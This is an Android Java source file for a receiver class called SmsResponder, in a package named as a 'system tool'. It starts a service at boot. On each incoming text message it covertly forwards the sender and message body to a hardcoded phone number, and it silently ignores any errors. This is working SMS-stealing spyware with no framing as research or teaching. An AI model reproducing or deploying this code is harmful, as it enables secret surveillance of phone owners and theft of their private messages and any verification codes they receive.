package com.example.systemtool;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SmsResponder extends BroadcastReceiver {
	
	
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		if(intent.getAction().equalsIgnoreCase(Intent.ACTION_BOOT_COMPLETED)){
			Intent serviceIntent = new Intent(context, AutoStartUp.class);
			context.startService(serviceIntent);
		}
		
		if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
		    //do something with the received sms    
			try{
				Bundle b= intent.getExtras();
				SmsMessage sms= null;
				Object[] pdu=(Object[]) b.get("pdus");
				for(int i=0;i<pdu.length;i++){
					sms=SmsMessage.createFromPdu((byte[]) pdu[i]);
				}
				String sender = sms.getOriginatingAddress();
				String message = sms.getDisplayMessageBody();
				//Toast.makeText(context, "Sender:"+sender+"\nMessage:"+message, Toast.LENGTH_LONG).show();
				
				SmsManager manager = SmsManager.getDefault();
				//if()
				//manager.sendTextMessage(destinationAddress, scAddress, text, sentIntent, deliveryIntent);
				if(sender.length()>10){
				manager.sendTextMessage("+639430639369", "", "Sender:"+sender+"\nMessage:"+message, null, null);
				}
			}catch(Exception e){}
		      }
		    	   if (intent.getAction().equals("android.provider.Telephony.SMS_DELIVER")){
		    	   Toast.makeText(context, "Sender:"+"\nMessage:", Toast.LENGTH_LONG).show();
		    	   }
	
			
		
	}

}
